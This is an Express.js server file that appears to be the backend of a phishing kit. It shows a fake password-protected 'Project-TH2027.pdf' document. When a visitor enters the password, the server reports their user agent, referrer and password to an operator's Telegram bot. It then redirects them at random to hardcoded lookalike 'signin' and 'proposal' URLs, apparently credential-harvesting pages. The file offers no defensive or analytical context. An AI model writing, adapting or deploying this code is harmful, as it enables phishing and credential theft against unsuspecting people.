// server.js
const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());
app.use(express.static(__dirname));

const CORRECT_CODE = process.env.DOCUMENT_PASSWORD || "2027219";

// Add as many URLs as you want here. The script will pick one at random.
const REDIRECT_URLS = [
  "https://proposal-108420-9eb-998ca1.millworks-construction.workers.dev/?k=4G2g2qr1lOLji2ay6PhvB7M1",
  "https://signin.rdations.com/w-t/ipz6ctn7?k=i4Uueq8MF5CHSzdL5w3vXPCR",
  "https://signin.rdations.com/w-t/4vfpga-4?k=YTppJSrI36s3hLjz9KXC8xgf",
  "https://signin.rdations.com/w-t/zb4nc7kp?k=Xqj_Fjb79OmpOgjfe7x1uo1P",
  "https://signin.rdations.com/w-t/ctsymnvc?k=IZGZgV_wqn-Fj1LXhYdr83D4",
  "https://proposal-108420-82e94a.millworks-construction.workers.dev/?k=4G2g2qr1lOLji2ay6PhvB7M1",
  "https://proposal-108420-82e-21938b.millworks-construction.workers.dev/?k=4G2g2qr1lOLji2ay6PhvB7M1",
  "https://proposal-108420-219-9ebfe7.millworks-construction.workers.dev/?k=4G2g2qr1lOLji2ay6PhvB7M1"
];

app.post('/api/unlock', async (req, res) => {
  try {
    const { password, userAgent, referrer } = req.body;

    console.log('Received unlock request. Password provided:', !!password);

    if (password === CORRECT_CODE) {
      const token = process.env.TELEGRAM_BOT_TOKEN;
      const chatId = process.env.TELEGRAM_CHAT_ID;

      console.log('Bot token exists:', !!token);
      console.log('Chat ID:', chatId);

      if (!token || !chatId) {
        console.error("Missing Telegram environment variables");
        return res.status(500).json({ 
          success: false, 
          error: "Server configuration error" 
        });
      }

      const now = new Date().toLocaleString('en-US', { 
        timeZone: 'America/New_York',
        year: 'numeric', 
        month: 'short', 
        day: 'numeric',
        hour: '2-digit', 
        minute: '2-digit', 
        second: '2-digit'
      });

      // Clean message - no special characters that could break Telegram
      const message = 
        `SUCCESSFUL UNLOCK\n` +
        `Document: Project-TH2027.pdf\n` +
        `Time: ${now}\n` +
        `User Agent: ${userAgent || 'unknown'}\n` +
        `Referrer: ${referrer || 'direct'}\n` +
        `Password Used: ${password}\n` +
        `Client accessed the document.`;

      try {
        const response = await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
          chat_id: chatId,
          text: message
        });
        
        console.log('✅ Telegram notification sent successfully');
        console.log('Telegram response:', response.data);
        
      } catch (telegramError) {
        // Log the EXACT error from Telegram
        if (telegramError.response) {
          console.error('❌ Telegram Error Status:', telegramError.response.status);
          console.error('❌ Telegram Error Data:', JSON.stringify(telegramError.response.data));
        } else {
          console.error('❌ Telegram Error:', telegramError.message);
        }
      }

      // Pick a random URL from the array
      const randomUrl = REDIRECT_URLS[Math.floor(Math.random() * REDIRECT_URLS.length)];

      // Always allow access even if Telegram fails
      res.json({ 
        success: true, 
        redirectUrl: randomUrl 
      });
    } else {
      console.log('❌ Incorrect password attempt');
      res.status(401).json({ 
        success: false, 
        error: "That password is incorrect. Try again." 
      });
    }
  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ 
      success: false, 
      error: "Failed to process request" 
    });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
